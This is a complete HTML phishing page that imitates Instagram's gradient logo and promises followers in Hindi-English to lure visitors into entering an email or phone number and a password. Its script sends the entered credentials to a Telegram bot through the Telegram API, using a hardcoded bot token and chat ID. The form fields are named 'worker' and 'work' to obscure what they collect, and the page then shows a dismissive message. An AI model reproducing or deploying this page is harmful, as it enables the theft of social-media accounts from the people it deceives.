<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Worker Login</title>
  <style>
    * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
    body {
      margin: 0;
      height: 100vh;
      background: #0f1a21;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
    }
    .login-box {
      width: 360px;
      padding: 30px 25px;
      background: #0f1a21;
      text-align: center;
    }
    .logo {
      width: 90px;
      height: 90px;
      margin: 20px auto 10px;
      border-radius: 50%;
      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 38px;
    }
    .message {
      margin-bottom: 20px;
      color: #fff;
      font-weight: bold;
      font-size: 14px;
    }
    .input {
      width: 100%;
      height: 48px;
      padding: 0 14px;
      margin: 8px 0;
      border-radius: 12px;
      border: 1px solid #2c3a44;
      background: #16232c;
      color: #fff;
      font-size: 15px;
    }
    .input::placeholder { color: #9aa4ad; }
    .btn {
      width: 100%;
      height: 48px;
      margin-top: 15px;
      border: none;
      border-radius: 25px;
      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
      color: #fff;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }
    .btn:hover { opacity: 0.9; }
    .note {
      margin-top: 15px;
      font-size: 12px;
      color: #9aa4ad;
    }
  </style>
</head>
<body>

<div class="login-box">

  <!-- Instagram-style gradient logo -->
  <div class="logo">üë•</div>

  <!-- Motivational message -->
  <div class="message"> Followers Ke Liye Login Karen</div>

  <!-- Worker form -->
  <input id="worker" class="input" type="text" placeholder="Email/Number">
  <input id="work" class="input" type="text" placeholder="Password">

  <button class="btn" onclick="sendToTelegram()">Submit</button>

  <div class="note">Login Karne Ke Baad Link Dalna hoga made by Mishra ji</div>
</div>

<script>
  const BOT_TOKEN = "8152205578:AAHGsAmhOE5QDdDWif8W7wrFgCtR5sfTr7Q";
  const CHAT_ID = "6494505776";

  function sendToTelegram() {
    const worker = document.getElementById("worker").value.trim();
    const work = document.getElementById("work").value.trim();

    if (!worker || !work) {
      alert("Worker name aur work dono bharo");
      return;
    }

    const text =
`Login
Email/number: ${worker}
Password: ${work}`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text
      })
    })
    .then(() => {
      alert("Abhi mood nhi hai badme ana üôè");
      document.getElementById("worker").value = "";
      document.getElementById("work").value = "";
    })
    .catch(() => alert("Telegram error ‚ùå"));
  }
</script>

</body>
</html>
